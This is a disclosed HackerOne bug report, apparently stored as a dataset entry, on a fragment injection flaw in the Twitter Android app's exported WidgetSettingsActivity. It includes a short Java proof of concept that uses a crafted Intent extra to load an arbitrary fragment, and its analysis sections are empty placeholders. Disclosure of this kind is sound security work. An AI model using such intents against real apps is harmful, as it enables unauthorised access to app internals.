---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '43988'
original_report_id: '43988'
title: twitter android app Fragment Injection
weakness: Command Injection - Generic
team_handle: x
created_at: '2015-01-16T06:26:28.004Z'
disclosed_at: '2015-04-11T23:57:14.017Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- command-injection-generic
---

# twitter android app Fragment Injection

## Metadata

- HackerOne Report ID: 43988
- Weakness: Command Injection - Generic
- Program: x
- Disclosed At: 2015-04-11T23:57:14.017Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

com.twitter.android.WidgetSettingsActivity extend PreferenceActivity and export.
By entering the appropriate extra intent can call any of its internal fragment.
So do not export com.twitter.android.WidgetSettingsActivity
（http://securityintelligence.com/new-vulnerability-android-framework-fragment-injection）

POC：(can make app crash)
private void testtwitter(){
        Intent i = new Intent();
        i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
        i.setClassName("com.twitter.android","com.twitter.android.WidgetSettingsActivity");
        i.putExtra(":android:show_fragment","com.samsung.android.sdk.pen.objectruntime.preload.VideoIntentFragment");
        //i.putExtra("confirmcredentials",false);
        startActivity(i);
	}

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
